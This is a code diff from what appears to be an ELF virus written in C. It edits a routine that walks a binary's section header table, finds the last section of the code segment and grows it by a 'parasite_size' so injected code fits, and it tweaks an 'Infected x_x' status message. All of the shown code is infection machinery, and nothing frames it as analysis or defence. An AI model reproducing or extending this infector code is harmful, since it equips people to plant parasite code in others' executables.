@@ -148,7 +148,7 @@ void ElfParser(char *filepath)
 
 
 	// DEBUG
-	fprintf(stdout, BLUE"[+]"RED"Infected x_x"RESET"  :  "GREEN"%s\n"RESET, filepath);
+	fprintf(stdout, BLUE"[+]"RED" Infected x_x"RESET"  :  "GREEN"%s\n"RESET, filepath);
 
 
 
@@ -189,62 +189,28 @@ void PatchSHT(void *map_addr)
 	
 	
 	Elf64_Off	sht_offset 		= elf_header->e_shoff;
-	uint16_t	sht_entry_size 	= elf_header->e_shentsize;
 	uint16_t	sht_entry_count	= elf_header->e_shnum;
-	uint64_t	sht_size		= sht_entry_count * sht_entry_size ;
-
-
-    Elf64_Off 	end_offset_of_elf = (sht_offset + sht_size),
-				current_section_end_offset;
+    Elf64_Off	current_section_end_offset;
 
 
     // Point shdr (Pointer to iterate over SHT) to the last entry of SHT
-    Elf64_Shdr *section_entry = (Elf64_Shdr *) (map_addr +
-                                                end_offset_of_elf -
-                                                sht_entry_size);
-
-    // .shstrtab section stores all section names (NULL terminated ASCII strings, back-to-back)
-    char *shstrtab_section;
+    Elf64_Shdr *section_entry = (Elf64_Shdr *) (map_addr + sht_offset);
 
 
-    // Parse the SHT bottom->up ( i.e. from last entry(.shstrtab) upto 2nd entry (after NULL entry)) 
-    // This way we'll be able to identify .text section in one parse of SHT.
     int i;
-    uint16_t SECTION_FOUND = 0;
-    for ( i=0 ; i < (sht_entry_count-1) ; ++i )
+    for ( i=0 ; i < sht_entry_count ; ++i )
     {
-		// Name is in the form of an index of .shstrtab section
-        Elf64_Off section_name_offset = section_entry->sh_name;
+		current_section_end_offset = section_entry->sh_offset + section_entry->sh_size;
 
+        if ( code_segment_end_offset == current_section_end_offset) {
 
-        // ASSUMPTION : Last entry is always .shstrtab section header !
-        // Last entry is usually .shstrtab (through which we'll indirectly get the section names)
-        if (i == 0)
-        {
-            // section_entry->offset tells at what offset is the current section is present in binary
-            shstrtab_section = (char *)(map_addr + section_entry->sh_offset);
-        }
-
-
-		// Find the last section of the CODE segment  
-		else {
-
-            char *current_section_name = (char *) (shstrtab_section + section_name_offset);
-            current_section_end_offset = section_entry->sh_offset + section_entry->sh_size;
-
-
-            if ( code_segment_end_offset == current_section_end_offset) {
-
-                // This is the last section of CODE Segment
-				// Increase the sizeof this section by a parasite_size to accomodate parasite
-				SECTION_FOUND   = 1;
-                section_entry->sh_size = section_entry->sh_size + parasite_size;
-			} 
-		}
-
-
-        // Move to the next section entry
-        --section_entry;
+            // This is the last section of CODE Segment
+			// Increase the sizeof this section by a parasite_size to accomodate parasite
+            section_entry->sh_size = section_entry->sh_size + parasite_size;
+			return;
+		} 
+    // Move to the next section entry
+    ++section_entry;
     }
 }
 
